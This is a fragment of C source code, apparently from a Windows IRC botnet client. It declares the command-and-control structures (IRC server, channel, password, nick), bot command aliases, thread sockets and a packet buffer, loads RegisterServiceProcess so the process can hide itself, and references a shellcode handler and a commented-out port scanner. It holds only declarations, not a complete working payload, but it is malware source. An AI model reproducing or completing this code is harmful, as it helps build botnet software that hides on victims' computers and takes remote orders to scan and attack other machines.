
// macro for predefined aliases. (these are just examples, you can change them to whatever you want)
#define addpredefinedaliases() \
	

typedef struct ircs {
	char host[128];
	int port;
	char channel[64];
	char chanpass[64];
	char nick[16];
	int threadnum;
	BOOL gotinfo;
} ircs;

// alias structure
typedef struct as {
	char name[24];
	char command[160];
} as;
// wininet.dll function variables
typedef int (__stdcall *IGCSE)(LPDWORD, char *, DWORD, DWORD);
IGCSE fInternetGetConnectedStateEx;
typedef int (__stdcall *IGCS)(LPDWORD, DWORD);
IGCS fInternetGetConnectedState;
// kernel32.dll function variables

typedef int (__stdcall *RSP)(DWORD, DWORD);
RSP fRegisterServiceProcess;

//char scanip[20];
//SOCKET sock2;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);

// global variables
HANDLE ih;
ircs mainirc;           // main irc structure
char prefix1 = prefix;  // prefix variable
int authsize=(sizeof(authost)/sizeof(IRCLINE));
int serversize = (sizeof(servers)/sizeof(servers[0])-1);
//	HANDLE ih;              // internet handle
THREAD threads[MAXTHREADS]; //new thread handles

SOCKET csock[64];       // thread sockets
char cnick[64][16];     // thread nicks
char log[128][128];     // log entries
DWORD w;                // DWORD used for various stuff
as aliases[maxaliases]; // alias array
int anum = 16;          // number of aliases
BOOL success = FALSE;   // if true then we made successful connect attempt
char tempdir[256];      // name of temp folder
char pbuff[65500];      // packet buffer
BOOL noigcse;           // if true, InternetGetConnectedStateEx function is available
BOOL noicmp;            // if true, icmp.dll is available=
DWORD started;          // time bot was started
int transfers = 0;
bool transfer_info = false;
char * rndnick2(char *strbuf);
void irc_send(SOCKET sock, char *msg);
//DWORD WINAPI PortScanner(LPVOID param);

ShellcodeHandler_s				pShellcodeHandler;
